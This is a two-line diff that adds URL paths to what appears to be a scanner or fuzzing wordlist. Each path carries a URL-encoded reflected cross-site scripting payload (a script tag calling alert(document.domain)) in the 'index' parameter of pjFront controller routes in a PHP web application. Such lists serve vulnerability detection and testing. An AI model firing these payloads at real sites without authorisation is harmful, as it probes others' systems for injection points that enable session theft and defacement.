@@ -1,0 +1,2 @@
+/index.php?controller=pjFrontPublic&action=pjActionServices&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/index.php?controller=pjFront&action=pjActionSearch&session_id=&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&date=
